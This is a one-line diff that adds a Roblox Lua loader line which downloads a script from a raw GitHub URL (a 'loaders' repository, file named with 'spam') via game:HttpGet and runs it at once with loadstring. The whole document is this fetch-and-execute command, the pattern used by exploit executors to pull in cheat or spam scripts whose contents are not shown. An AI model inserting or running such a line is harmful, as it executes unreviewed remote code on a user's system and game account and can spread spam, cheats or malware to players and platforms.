@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/beta-buddytime-spam1-s4o49w5qgwe4d2.lua"))()
